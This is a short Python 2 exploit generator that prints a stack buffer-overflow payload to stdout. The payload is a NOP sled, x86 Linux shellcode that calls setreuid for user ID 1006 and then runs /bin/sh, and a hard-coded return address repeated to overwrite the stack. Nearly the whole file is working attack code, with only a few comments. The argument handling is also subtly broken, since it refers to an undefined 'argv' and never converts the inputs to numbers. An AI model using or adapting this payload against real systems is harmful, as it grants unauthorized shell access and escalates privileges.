import sys

#sp = '\xb0\xfc\xff\xbf'
#sp = '\xbf\xff\xfd\xb8'
sp = '\xb8\xfd\xff\xbf'

buff_size = 128
overrun = 100

if(len(sys.argv) > 1):
    buff_size = argv[1]
if(len(sys.argv) > 2):
    overrun = argv[2]

shellcode = '\x31\xc0\x31\xdb\x31\xc9\x83\xc0\x46\x66\x81\xc3\xee\x03\x66\x81\xc1\xee\x03\xcd\x80\xeb\x0f\x31\xc0\x83\xc0\x0b\x5b\x88\x63\x07\x31\xc9\x31\xd2\xcd\x80\xe8\xec\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e'

payload = '\x90' * (buff_size - len(shellcode) - 1)

payload = payload + shellcode

payload = payload + ('\x90' * (4 - (len(payload) % 4)))

for x in xrange(overrun / 4):
    payload = payload + sp

sys.stdout.write(payload)
